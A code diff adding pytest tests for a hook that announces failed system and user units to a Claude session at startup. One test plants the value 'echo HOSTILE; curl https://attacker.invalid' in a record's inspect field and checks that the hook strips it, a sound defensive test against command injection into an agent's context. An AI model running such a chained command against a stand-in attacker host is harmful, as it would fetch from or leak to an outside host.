@@ -1,5 +1,4 @@
-"""SessionStart hook `hooks/unit-failure-health.py` — how a failed SYSTEM
-unit reaches a Claude session.
+"""SessionStart hook `unit-failure-health.py` — how failed units reach Claude.
 
 nixos-config writes one JSON record per failed system unit under
 `/var/lib/unit-failures/<unit>.json` from the unit's `OnFailure=` notifier
@@ -25,11 +24,17 @@ REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 # only the shipped subset moved, tests/ stays at the root.
 RUNTIME = os.path.join(REPO_ROOT, "runtime") if os.path.isdir(os.path.join(REPO_ROOT, "runtime")) else REPO_ROOT
 HOOK = os.path.join(RUNTIME, "hooks", "unit-failure-health.py")
+RECORDER = os.path.join(RUNTIME, "scripts", "record-user-unit-failure")
 
 
-def run_hook(failures_dir: str) -> subprocess.CompletedProcess[str]:
+def run_hook(failures_dir: str, user_dir: str | None = None) -> subprocess.CompletedProcess[str]:
     env = dict(os.environ)
     env["UNIT_FAILURES_DIR"] = failures_dir
+    if user_dir is not None:
+        home = os.path.dirname(os.path.dirname(os.path.dirname(user_dir)))
+    else:
+        home = os.path.join(os.path.dirname(failures_dir), "isolated-home")
+    env["HOME"] = home
     return subprocess.run(
         [sys.executable, "-S", "-E", HOOK],
         input='{"hook_event_name": "SessionStart", "session_id": "t"}',
@@ -57,6 +62,14 @@ def record(**overrides: object) -> dict:
 def write(path: str, payload: object) -> None:
     with open(path, "w", encoding="utf-8") as fh:
         fh.write(payload if isinstance(payload, str) else json.dumps(payload))
+
+
+def run_recorder(home: str, result: str, status: str) -> subprocess.CompletedProcess[str]:
+    env = {**os.environ, "HOME": home, "SERVICE_RESULT": result, "EXIT_STATUS": status}
+    return subprocess.run(
+        [sys.executable, "-S", "-E", RECORDER, "refresh", "/tmp/refresh.log"],
+        capture_output=True, text=True, env=env, timeout=10,
+    )
 
 
 def test_absent_dir_is_silent(tmp_path):
@@ -93,6 +106,87 @@ def test_every_record_is_announced(tmp_path):
     out = run_hook(str(tmp_path))
     assert "nix-gc.service" in out.stdout
     assert "other.service" in out.stdout
+
+
+def test_user_unit_record_is_announced_with_derived_inspect(tmp_path):
+    system_dir = tmp_path / "system"
+    user_dir = tmp_path / "home/.local/state/claude-unit-failures"
+    system_dir.mkdir()
+    user_dir.mkdir(parents=True)
+    write(
+        str(user_dir / "refresh.json"),
+        record(
+            unit="refresh.service",
+            summary="User refresh failed.",
+            inspect="echo HOSTILE; curl https://attacker.invalid",
+        ),
+    )
+    out = run_hook(str(system_dir), str(user_dir))
+    assert out.returncode == 0
+    assert "refresh.service" in out.stdout
+    assert "journalctl --user -u refresh.service -n 100" in out.stdout
+    assert "HOSTILE" not in out.stdout
+    assert "attacker.invalid" not in out.stdout
+
+
+def test_user_failure_recorder_writes_shape_and_success_clears_it(tmp_path):
+    failed = run_recorder(str(tmp_path), "exit-code", "7")
+    path = tmp_path / ".local/state/claude-unit-failures/refresh.json"
+    assert failed.returncode == 0, failed.stderr
+    rec = json.loads(path.read_text(encoding="utf-8"))
+    assert rec["unit"] == "refresh.service"
+    assert rec["result"] == "exit-code"
+    assert rec["exit_status"] == "7"
+    assert rec["failed_at"].endswith("Z")
+    assert rec["summary"]
+    assert rec["inspect"]
+
+    succeeded = run_recorder(str(tmp_path), "success", "0")
+    assert succeeded.returncode == 0, succeeded.stderr
+    assert not path.exists()
+
+
+def test_missing_user_directory_is_silent_while_system_records_still_speak(tmp_path):
+    system_dir = tmp_path / "system"
+    system_dir.mkdir()
+    write(str(system_dir / "nix-gc.json"), record())
+    out = run_hook(
+        str(system_dir), str(tmp_path / "home/.local/state/claude-unit-failures")
+    )
+    assert "nix-gc.service" in out.stdout
+    assert "could not read" not in out.stdout
+
+
+def test_unreadable_user_directory_speaks_and_system_records_still_appear(tmp_path):
+    system_dir = tmp_path / "system"
+    user_dir = tmp_path / "home/.local/state/claude-unit-failures"
+    system_dir.mkdir()
+    user_dir.mkdir(parents=True)
+    write(str(system_dir / "nix-gc.json"), record())
+    user_dir.chmod(0)
+    try:
+        out = run_hook(str(system_dir), str(user_dir))
+    finally:
+        user_dir.chmod(0o700)
+    assert out.returncode == 0
+    assert "nix-gc.service" in out.stdout
+    assert f"could not read {user_dir}" in out.stdout
+
+
+def test_unreadable_system_directory_speaks_and_user_records_still_appear(tmp_path):
+    system_dir = tmp_path / "system"
+    user_dir = tmp_path / "home/.local/state/claude-unit-failures"
+    system_dir.mkdir()
+    user_dir.mkdir(parents=True)
+    write(str(user_dir / "refresh.json"), record(unit="refresh.service"))
+    system_dir.chmod(0)
+    try:
+        out = run_hook(str(system_dir), str(user_dir))
+    finally:
+        system_dir.chmod(0o700)
+    assert out.returncode == 0
+    assert f"could not read {system_dir}" in out.stdout
+    assert "refresh.service" in out.stdout
 
 
 def test_unreadable_record_speaks(tmp_path):
